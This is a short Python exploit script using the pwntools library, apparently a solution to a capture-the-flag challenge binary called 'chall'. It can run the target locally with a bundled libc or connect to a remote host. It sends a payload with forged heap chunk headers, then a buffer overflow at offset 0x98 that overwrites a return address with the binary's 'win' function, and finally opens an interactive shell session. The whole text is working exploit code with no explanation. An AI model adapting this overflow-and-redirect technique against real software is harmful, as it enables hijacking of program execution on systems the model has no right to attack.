from pwn import *
import os

exe = ELF("./chall")

def start():
    if args.REMOTE:
        host = args.HOST or os.environ.get("HOST", "127.0.0.1")
        port = int(args.PORT or os.environ.get("PORT", "9001"))
        return remote(host, port)

    loader = "./ld-2.31.so"
    libc = "./libc-2.31.so"
    if os.path.exists(loader) and os.path.exists(libc):
        return process([loader, "--library-path", ".", exe.path])
    return process(exe.path)

def main():
    p = start()

    p.sendlineafter(b"> ", b"1")
    payload = p64(0)
    payload += p64(0x41)
    payload = payload.ljust(0x40, b"B")
    payload += p64(0)
    payload += p64(0x41)
    payload = payload.ljust(0x90, b"C")

    p.send(payload)

    offset = 0x98
    payload2 = b"D" * offset
    payload2 += p64(exe.symbols["win"])

    p.send(payload2)
    p.interactive()

if __name__ == "__main__":
    main()
